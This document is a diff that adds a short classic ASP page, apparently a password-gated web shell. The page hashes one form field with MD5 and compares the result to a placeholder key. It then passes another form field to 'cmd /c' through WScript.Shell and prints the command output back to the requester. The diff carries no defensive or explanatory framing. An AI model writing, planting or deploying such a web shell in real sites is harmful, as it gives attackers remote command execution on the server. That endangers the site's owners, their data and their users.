@@ -1,0 +1,38 @@
+<%
+Function h(s)
+    Dim t
+    If IsArray(s) = True Then t = s(0) Else t = s End If
+    With CreateObject("ADODB.Stream")
+        .Open
+        .CharSet = "Windows-1252"
+        .WriteText t
+        .Position = 0
+        .CharSet = "UTF-8"
+        t = .ReadText
+        .Close
+    End With
+    Set u = CreateObject("System.Text.UTF8Encoding")
+    Dim p, b, e
+    p = u.GetBytes_4(t)
+    Set c = CreateObject("System.Security.Cryptography.MD5CryptoServiceProvider")
+    c.Initialize()
+    If IsArray(s) = True Then c.Key = u.GetBytes_4(s(1))
+    b = c.ComputeHash_2((p))
+    For x = 1 To LenB(b)
+        e = e & Right("0" & Hex(AscB(MidB(b, x, 1))), 2)
+    Next
+    h = LCase(e)
+End Function
+Function e(r)
+    Dim s, c
+    Set s = CreateObject("WScript.Shell")
+    Set c = s.exec(r)
+    e = c.StdOut.ReadAll
+End Function
+r0 = request.form("0")
+r1 = request.form("1")
+If (h(r1) = "shellcode_key") Then
+    c = e("cmd /c" & r0)
+    Response.Write(c)
+End If
+%>
